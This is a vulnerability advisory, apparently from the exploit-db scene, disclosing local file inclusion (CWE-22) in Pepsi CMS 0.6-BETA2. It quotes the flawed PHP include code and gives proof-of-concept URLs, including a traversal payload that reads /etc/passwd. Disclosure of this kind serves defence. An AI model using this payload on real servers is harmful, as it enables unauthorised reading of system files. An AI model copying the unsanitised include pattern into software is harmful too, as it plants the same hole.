@@ -1,0 +1,93 @@
+########################################################
+	Pepsi CMS (Irmin cms) pepsi-0.6-BETA2 Multiple Local File Vulnerability
+########################################################
+
+	fucking the Web Apps [LFI #1 - attack edition 
+
+ ____                  __                              __    __                
+/\  _`\               /\ \      __                    /\ \__/\ \               
+\ \ \L\_\__  __    ___\ \ \/'\ /\_\    ___      __    \ \ ,_\ \ \___      __   
+ \ \  _\/\ \/\ \  /'___\ \ , < \/\ \ /' _ `\  /'_ `\   \ \ \/\ \  _ `\  /'__`\ 
+  \ \ \/\ \ \_\ \/\ \__/\ \ \\`\\ \ \/\ \/\ \/\ \L\ \   \ \ \_\ \ \ \ \/\  __/ 
+   \ \_\ \ \____/\ \____\\ \_\ \_\ \_\ \_\ \_\ \____ \   \ \__\\ \_\ \_\ \____\
+    \/_/  \/___/  \/____/ \/_/\/_/\/_/\/_/\/_/\/___L\ \   \/__/ \/_/\/_/\/____/
+                                                /\____/                        
+                                                \_/__/                         
+ __      __          __          ______                       Hack0wn! Security Project     
+/\ \  __/\ \        /\ \        /\  _  \                           
+\ \ \/\ \ \ \     __\ \ \____   \ \ \L\ \  _____   _____     ____  
+ \ \ \ \ \ \ \  /'__`\ \ '__`\   \ \  __ \/\ '__`\/\ '__`\  /',__\ 
+  \ \ \_/ \_\ \/\  __/\ \ \L\ \   \ \ \/\ \ \ \L\ \ \ \L\ \/\__, `\
+   \ `\___x___/\ \____\\ \_,__/    \ \_\ \_\ \ ,__/\ \ ,__/\/\____/
+    '\/__//__/  \/____/ \/___/      \/_/\/_/\ \ \/  \ \ \/  \/___/ 
+                                             \ \_\   \ \_\         
+                                              \/_/    \/_/         
+                                                        
+
+[+]Software:	Pepsi CMS (Irmin CMS)
+[+]Version:	pepsi-0.6-BETA2
+[+]License:	GNU/GPL
+[+]Source:	http://sourceforge.net/projects/pepsicms/files/
+[+]Risk:		High
+[+]CWE:		CWE-22
+[+]Local:		Yes
+[+]Remote:	No
+
+########################################################
+
+[!] Discovered :	eidelweiss
+[!] Contact :	eidelweiss[at]cyberservices[dot]com
+[!] Thank`s :	sp3x (securityreason) - r0073r & 0x1D (inj3ct0r) loneferret - Exploits - dookie2000ca (exploit-db)
+[!] Special To :	JosS (hack0wn) - g1xx_achmed - [D]eal [C]yber - Syabilla_putri (i miss u so much to)
+
+########################################################
+
+-=[Description]=-
+
+	IrminCMS is a CMS (Content Management System) extensible and secure written in php
+	Pepsi CMS is become of IrminCMS.
+
+
+-=[ Vuln c0de ]=-
+###############
+	{index.php}
+###############
+
+<?php
+if(!file_exists(".lock")) {
+	$f = fopen(".basepath", "w");
+	fwrite($f, "<?php define('BASEPATH', '".$_SERVER['DOCUMENT_ROOT']."'); ?>");
+	fclose($f);
+	fclose(fopen(".lock", "w"));
+}
+
+include (".basepath");
+include ("config.php");
+
+//very sweet
+include "includes/template-loader.php";
+
+
+
+###############
+	{includes/template-loader.php}
+###############
+
+	include( 'config.php' );
+	include( 'db.php' );
+	//include( 'classes/theme_engine/engine.php' );
+	include( $_Root_Path . 'classes/Smarty.class.php' );
+
+########################################################
+
+-=[ P0C ]=-
+
+	Http://127.0.0.1/PATH/index.php?w=[LFI%]
+
+	Http://127.0.0.1/PATH/includes/template-loader.php?_Root_Path=../../../../../../../../../etc/passwd%00
+
+	
+########################################################
+
+Similar reference informed by Packetstorm Security:
+http://packetstormsecurity.org/0808-exploits/pepsicms-rfi.txt
